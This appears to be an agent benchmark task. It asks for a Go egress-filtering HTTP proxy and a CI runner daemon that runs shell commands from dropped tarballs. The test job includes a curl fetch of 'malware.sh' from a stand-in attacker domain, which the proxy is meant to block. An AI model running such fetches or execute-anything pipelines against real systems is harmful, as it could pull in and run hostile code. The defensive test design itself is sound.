As an infrastructure engineer automating provisioning, you need to build a lightweight, secure local CI/CD runner system using Go. Since you are operating in an unprivileged user space (`/home/user`), you will simulate network firewalling by building an HTTP egress proxy, and you will implement process monitoring and filesystem isolation within a specific directory structure.

Your objective is to complete the following phases:

**Phase 1: Filesystem Structure**
Create the following directory structure:
- `/home/user/ci-system/commits/` (where incoming code payloads are dropped)
- `/home/user/ci-system/workspace/` (where code is extracted)
- `/home/user/ci-system/logs/` (where run logs are stored)

**Phase 2: Egress Firewall Proxy (Go)**
Write a Go program at `/home/user/egress_proxy.go`. This program must:
1. Listen on `127.0.0.1:8080`.
2. Act as an HTTP proxy.
3. Inspect the `Host` header of incoming HTTP requests.
4. If the `Host` is exactly `allowed-registry.local`, forward the request to `127.0.0.1:9090`.
5. For any other `Host`, immediately return an HTTP 403 Forbidden status with the body "BLOCKED".

Compile this to `/home/user/egress_proxy` and start it in the background.

**Phase 3: CI Runner and Process Monitor (Go)**
Write a Go program at `/home/user/ci_runner.go`. This program must act as a daemon that:
1. Constantly watches `/home/user/ci-system/commits/` for new `.tar.gz` files.
2. When a file (e.g., `job-123.tar.gz`) is detected:
   - Create a dedicated directory `/home/user/ci-system/workspace/job-123/`.
   - Extract the tarball into this directory.
   - Read the file `ci.txt` from the extracted contents. The first line of this file contains a shell command to execute.
   - Execute the shell command using `sh -c "<command>"`.
   - **Crucially:** Ensure the environment variable `http_proxy=http://127.0.0.1:8080` is injected into the build process's environment.
   - Immediately upon starting the process, write the process ID (PID) to `/home/user/ci-system/logs/job-123.pid`.
   - Wait for the process to exit. If it exits with status 0, write the string `SUCCESS` to `/home/user/ci-system/logs/job-123.status`. Otherwise, write `FAILED`.
   - Delete the `.tar.gz` file to avoid reprocessing.

Compile this to `/home/user/ci_runner` and start it in the background.

**Phase 4: Testing**
To verify your system, create a dummy job:
1. Create a script `/tmp/build.sh` that executes:
   `curl -s http://allowed-registry.local/data.json > output.txt`
   `curl -s http://evil-domain.com/malware.sh >> output.txt`
2. Create a `ci.txt` file containing exactly: `sh build.sh`
3. Archive `build.sh` and `ci.txt` into `/home/user/ci-system/commits/job-999.tar.gz`.

Your CI runner should detect it, extract it, run the script through your proxy, and generate the corresponding `.pid` and `.status` files. Ensure everything is running before concluding your task.